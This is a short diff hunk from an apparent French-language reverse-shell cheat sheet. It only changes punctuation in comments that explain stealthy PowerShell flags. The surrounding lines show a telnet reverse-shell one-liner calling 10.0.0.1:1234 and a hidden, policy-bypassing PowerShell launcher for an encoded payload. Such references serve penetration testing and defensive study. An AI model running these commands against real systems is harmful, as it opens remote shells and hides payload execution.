@@ -173,11 +173,11 @@ rm -f /tmp/f; mknod /tmp/f p && telnet 10.0.0.1 1234 0/tmp/p
 ### Powershell
 
 ```powershell
-# -nop        : NoProfile — ne charge pas le profil PowerShell (plus furtif, plus rapide)
-# -noni       : NonInteractive — pas de prompt, pas d'input utilisateur
-# -w hidden   : WindowStyle Hidden — fenêtre invisible
-# -ep bypass  : ExecutionPolicy Bypass — ignore la politique d'exécution des scripts
-# -e          : EncodedCommand — payload base64 encodé en UTF-16LE
+# -nop        : NoProfile -  ne charge pas le profil PowerShell (plus furtif, plus rapide)
+# -noni       : NonInteractive -  pas de prompt, pas d'input utilisateur
+# -w hidden   : WindowStyle Hidden -  fenêtre invisible
+# -ep bypass  : ExecutionPolicy Bypass -  ignore la politique d'exécution des scripts
+# -e          : EncodedCommand -  payload base64 encodé en UTF-16LE
 
 powershell -nop -noni -w hidden -ep bypass -e <BASE64_PAYLOAD>
 ```
